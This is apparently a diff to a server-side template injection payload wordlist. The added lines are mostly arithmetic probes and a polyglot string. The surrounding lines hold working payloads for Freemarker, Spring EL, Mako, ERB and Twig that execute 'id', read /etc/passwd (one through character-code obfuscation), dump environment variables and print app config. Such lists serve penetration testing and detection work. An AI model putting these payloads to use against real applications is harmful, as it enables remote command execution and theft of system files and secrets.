@@ -2,10 +2,12 @@
 #{ 7 * 7 }
 #{3*3}
 #{42*42}
+#{7*7}
 ${"freemarker.template.utility.Execute"?new()("id")}
 ${3*3}
 ${42*42}
 ${6*6}
+${7*7}
 ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
 ${T(java.lang.System).getenv()}
 ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
@@ -66,17 +68,20 @@ ${self.template.module.runtime.util.compat.inspect.os.system("id")}
 ${self.template.module.runtime.util.os.system("id")}
 ${{3*3}}
 ${{7*7}}
+${{<%[%'"}}%\
 *{7*7}
 *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
 42*42
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
 <%= 3 * 3 %>
 <%= 7 * 7 %>
+<%= 7*7 %>
 <%= File.open('/etc/passwd').read %>
 <%=42*42 %>
 @(1+2)
 @(6+5)
 [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+[7*7]
 [[${42*42}]]
 {$smarty.version}
 {% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
@@ -107,6 +112,7 @@ ${{7*7}}
 {{42*42}}
 {{7*'7'}}
 {{7*7}}
+{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}${{<%[%'"}}%\
 {{=42*42}}
 {{['cat$IFS/etc/passwd']|filter('system')}}
 {{['cat\x20/etc/passwd']|filter('system')}}
